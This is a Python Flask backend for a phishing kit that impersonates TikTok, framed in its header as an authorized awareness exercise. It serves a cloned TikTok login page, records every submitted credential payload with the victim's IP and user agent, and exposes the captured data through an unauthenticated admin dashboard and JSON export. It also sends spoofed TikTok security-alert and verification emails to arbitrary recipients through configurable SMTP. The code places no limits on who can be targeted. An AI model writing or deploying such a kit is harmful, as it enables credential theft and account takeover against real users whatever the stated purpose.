#!/usr/bin/env python3
"""
TikTok Phishing Simulation - Flask Backend
Authorized security awareness exercise
"""

import os
import json
import logging
from datetime import datetime
from flask import Flask, render_template, request, jsonify, redirect, url_for, send_from_directory
from flask_cors import CORS

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('phishing_simulation.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = 'your-secret-key-change-in-production'
CORS(app)

# In-memory storage for submissions
submissions = []

@app.route('/')
def index():
    """Redirect to TikTok login page"""
    return redirect(url_for('tiktok_login'))

@app.route('/tiktok-login')
def tiktok_login():
    """Serve the TikTok login page"""
    try:
        return render_template('tiktok_login.html')
    except Exception as e:
        logger.error(f"Error serving TikTok login page: {e}")
        return "Error loading page", 500

@app.route('/submit-login', methods=['POST'])
def submit_login():
    """Handle login form submissions"""
    try:
        data = request.get_json()
        
        # Extract form data
        form_type = data.get('form_type', 'unknown')
        timestamp = datetime.now().isoformat()
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        # Create submission record
        submission = {
            'id': len(submissions) + 1,
            'timestamp': timestamp,
            'ip_address': ip_address,
            'user_agent': user_agent,
            'form_type': form_type,
            'data': data
        }
        
        # Add to submissions list
        submissions.append(submission)
        
        logger.info(f"Login submission received - Type: {form_type}, IP: {ip_address}")
        
        return jsonify({
            'success': True,
            'message': 'Login successful! Redirecting...',
            'submission_id': submission['id']
        })
        
    except Exception as e:
        logger.error(f"Error processing login submission: {e}")
        return jsonify({
            'success': False,
            'message': 'Error processing submission'
        }), 500

@app.route('/send-code', methods=['POST'])
def send_code():
    """Handle verification code sending"""
    try:
        data = request.get_json()
        
        # Extract phone data
        country_code = data.get('country_code', '')
        phone = data.get('phone', '')
        timestamp = datetime.now().isoformat()
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        # Create code sending record
        submission = {
            'id': len(submissions) + 1,
            'timestamp': timestamp,
            'ip_address': ip_address,
            'user_agent': user_agent,
            'form_type': 'code_sent',
            'data': {
                'country_code': country_code,
                'phone': phone,
                'status': 'Code sent'
            }
        }
        
        # Add to submissions list
        submissions.append(submission)
        
        logger.info(f"Verification code sent - Phone: {country_code}{phone}, IP: {ip_address}")
        
        return jsonify({
            'success': True,
            'message': 'Verification code sent!',
            'submission_id': submission['id']
        })
        
    except Exception as e:
        logger.error(f"Error processing code sending: {e}")
        return jsonify({
            'success': False,
            'message': 'Error sending code'
        }), 500

@app.route('/logo/<filename>')
def serve_logo(filename):
    """Serve logo files for email embedding"""
    try:
        # Determine MIME type based on file extension
        if filename.lower().endswith('.jpg') or filename.lower().endswith('.jpeg'):
            mimetype = 'image/jpeg'
        elif filename.lower().endswith('.png'):
            mimetype = 'image/png'
        else:
            mimetype = 'image/jpeg'  # Default to JPEG
            
        return send_from_directory('static', filename, mimetype=mimetype)
    except Exception as e:
        logger.error(f"Error serving logo {filename}: {e}")
        return "Logo not found", 404

@app.route('/tiktok-logo')
def serve_tiktok_logo():
    """Serve the TikTok logo for email embedding (legacy route)"""
    return serve_logo('logo.jpg')

@app.route('/email-tester')
def email_tester():
    """Serve the TikTok email tester page"""
    try:
        return render_template('tiktok_email_tester.html')
    except Exception as e:
        logger.error(f"Error serving email tester page: {e}")
        return "Error loading email tester page", 500

@app.route('/custom-email-sender')
def custom_email_sender():
    """Serve the custom email sender page"""
    try:
        return render_template('custom_email_sender.html')
    except Exception as e:
        logger.error(f"Error serving custom email sender page: {e}")
        return "Error loading custom email sender page", 500

@app.route('/admin')
def admin_dashboard():
    """Admin dashboard to view submissions"""
    try:
        return render_template('admin.html')
    except Exception as e:
        logger.error(f"Error serving admin dashboard: {e}")
        return "Error loading admin dashboard", 500

@app.route('/admin/data')
def admin_data():
    """API endpoint to get submission data"""
    try:
        return jsonify({
            'total_submissions': len(submissions),
            'email_logins': len([s for s in submissions if s['form_type'] == 'email']),
            'phone_logins': len([s for s in submissions if s['form_type'] == 'phone']),
            'codes_sent': len([s for s in submissions if s['form_type'] == 'code_sent']),
            'submissions': submissions
        })
    except Exception as e:
        logger.error(f"Error serving admin data: {e}")
        return jsonify({'error': 'Failed to fetch data'}), 500

@app.route('/admin/clear', methods=['POST'])
def clear_data():
    """Clear all submission data"""
    try:
        global submissions
        submissions.clear()
        logger.info("All submission data cleared")
        return jsonify({'success': True, 'message': 'All data cleared'})
    except Exception as e:
        logger.error(f"Error clearing data: {e}")
        return jsonify({'success': False, 'message': 'Error clearing data'}), 500

@app.route('/admin/export')
def export_data():
    """Export submission data as JSON"""
    try:
        from flask import send_file
        import tempfile
        
        # Create temporary file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(submissions, f, indent=2)
            temp_path = f.name
        
        logger.info("Data exported successfully")
        return send_file(temp_path, as_attachment=True, download_name=f'tiktok_submissions_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json')
        
    except Exception as e:
        logger.error(f"Error exporting data: {e}")
        return jsonify({'error': 'Failed to export data'}), 500

@app.route('/send-tiktok-email', methods=['POST'])
def send_tiktok_email():
    """Send TikTok security email"""
    try:
        data = request.get_json()
        
        # Extract email data
        recipient_email = data.get('email', '')
        email_type = data.get('type', 'security_alert')
        username = data.get('username', 'user')
        
        # Import TikTok email functions
        from smtp import send_tiktok_security_alert, send_tiktok_verification_required
        
        success = False
        if email_type == 'security_alert':
            success = send_tiktok_security_alert(recipient_email, 'new_device', username)
        elif email_type == 'verification_required':
            success = send_tiktok_verification_required(recipient_email, username)
        else:
            return jsonify({
                'success': False,
                'message': 'Invalid email type. Use "security_alert" or "verification_required"'
            }), 400
        
        if success:
            logger.info(f"TikTok email sent successfully - Type: {email_type}, To: {recipient_email}")
            return jsonify({
                'success': True,
                'message': f'TikTok {email_type} email sent successfully!',
                'email_type': email_type,
                'recipient': recipient_email
            })
        else:
            return jsonify({
                'success': False,
                'message': 'Failed to send TikTok email'
            }), 500
            
    except Exception as e:
        logger.error(f"Error sending TikTok email: {e}")
        return jsonify({
            'success': False,
            'message': 'Error sending TikTok email'
        }), 500

@app.route('/send-custom-email', methods=['POST'])
def send_custom_email():
    """Send custom email with user-provided SMTP settings"""
    try:
        data = request.get_json()
        
        # Extract email configuration
        template = data.get('template', 'tiktok_security')
        smtp_server = data.get('smtp_server', 'smtp.gmail.com')
        smtp_port = data.get('smtp_port', 587)
        sender_email = data.get('sender_email', '')
        sender_password = data.get('sender_password', '')
        recipient_email = data.get('recipient_email', '')
        subject = data.get('subject', '')
        username = data.get('username', 'user')
        custom_message = data.get('custom_message', '')
        
        # Validate required fields
        if not all([sender_email, sender_password, recipient_email, subject]):
            return jsonify({
                'success': False,
                'message': 'Missing required fields: sender_email, sender_password, recipient_email, subject'
            }), 400
        
        # Import and use custom SMTP function
        from smtp import send_custom_tiktok_email
        
        success = send_custom_tiktok_email(
            smtp_server=smtp_server,
            smtp_port=smtp_port,
            sender_email=sender_email,
            sender_password=sender_password,
            recipient_email=recipient_email,
            subject=subject,
            template=template,
            username=username,
            custom_message=custom_message
        )
        
        if success:
            logger.info(f"Custom email sent successfully - Template: {template}, To: {recipient_email}")
            return jsonify({
                'success': True,
                'message': f'Custom {template} email sent successfully to {recipient_email}!',
                'template': template,
                'recipient': recipient_email
            })
        else:
            return jsonify({
                'success': False,
                'message': 'Failed to send custom email. Check your SMTP settings and credentials.'
            }), 500
            
    except Exception as e:
        logger.error(f"Error sending custom email: {e}")
        return jsonify({
            'success': False,
            'message': f'Error sending custom email: {str(e)}'
        }), 500

@app.route('/health')
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'submissions_count': len(submissions)
    })

@app.errorhandler(404)
def not_found(error):
    """Handle 404 errors"""
    return jsonify({'error': 'Page not found'}), 404

@app.errorhandler(500)
def internal_error(error):
    """Handle 500 errors"""
    logger.error(f"Internal server error: {error}")
    return jsonify({'error': 'Internal server error'}), 500

if __name__ == '__main__':
    # Ensure templates directory exists
    os.makedirs('templates', exist_ok=True)
    
    # Get port from environment variable (Render sets this)
    port = int(os.environ.get('PORT', 5000))
    
    # Use 0.0.0.0 to bind to all available network interfaces
    # In production (Render), this will be handled by gunicorn
    if os.environ.get('FLASK_ENV') == 'production':
        # Production mode - gunicorn will handle the server
        pass
    else:
        # Development mode - run Flask dev server
        app.run(host='0.0.0.0', port=port, debug=False)
